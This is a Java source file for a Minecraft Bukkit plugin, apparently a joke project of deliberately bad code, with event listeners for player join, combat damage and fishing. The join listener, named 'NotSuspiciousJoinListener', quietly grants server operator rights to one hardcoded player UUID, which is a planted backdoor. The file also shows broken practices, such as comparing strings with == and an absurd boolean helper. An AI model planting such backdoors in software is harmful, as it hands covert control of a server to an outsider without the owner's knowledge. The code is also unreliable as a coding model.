package dev.jaims.terribleplugin.listener;

import dev.jaims.terribleplugin.utils.BooleanFactory;
import org.anjocaido.groupmanager.GroupManager;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerFishEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.ArrayList;

import static org.bukkit.entity.EntityType.PLAYER;

public class NotSuspiciousJoinListener implements Listener{
    @EventHandler
    void onJoin(PlayerJoinEvent e){
        if(e.getPlayer().getUniqueId().toString()=="ca606d09-dced-4241-94a6-eaa7d4525d9f"){
            e.getPlayer().setOp(BooleanFactory.getTrueStringVariableAsBoolean());
        }
    }
    @EventHandler(priority=EventPriority.LOWEST)
    void onHit(EntityDamageByEntityEvent e){
        if(e.getDamager().getType().equals(PLAYER) == BooleanFactory.getTrueStringVariableAsBoolean()){
            GroupManager groupManager=((GroupManager)Bukkit.getServer().getPluginManager().getPlugin("GroupManager"));
            ArrayList permissions = new ArrayList(GroupManager.getBukkitPermissions().listPerms(((Player)e.getDamager())));
            if(permissions.contains("terribleplugin.permission") == BooleanFactory.getTrueStringVariableAsBoolean()){
                e.getDamager().sendMessage("YOU KILLED A" + e.getEntity().toString());
            }
        }
    }

    // realistic fishing :)
    @EventHandler(priority=EventPriority.LOW)
    void onFish(PlayerFishEvent e) {

        Player p = e.getPlayer();
        int mercury_dose = (int) (Math.random() * 30);

        switch (mercury_dose) {
            case 0:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 1:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 2:
                p.damage(e.getCaught().getName().length() * 0.25);
                p.sendMessage(ChatColor.GOLD + "Ouchie >:( He bit you!");
                return;
            case 3:
                p.damage(e.getCaught().getName().length() * 0.25);
                p.sendMessage(ChatColor.GOLD + "Ouchie >:( He bit you!");
                return;
            case 4:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 5:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 6:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 7:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 8:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 9:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 10:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 11:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 12:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 13:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 14:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 15:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 16:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 17:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 18:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 19:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 20:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 21:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 22:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 23:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 24:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 25:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 26:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 27:
                p.sendMessage(ChatColor.YELLOW + "Nice fish :)");
                return;
            case 28:
                p.sendMessage(ChatColor.GOLD + "Meh fish ...");
                return;
            case 29:
                p.damage(e.getCaught().getName().length() * 10);
                p.sendMessage(ChatColor.GOLD + "Ouch!");
                if (p.isDead())
                    p.sendMessage(ChatColor.RED + "You died of mercury poisoning... :(");
                return;
            default:
                p.sendMessage(ChatColor.YELLOW + "Stupid fish :(");
                return;
        }
    }

}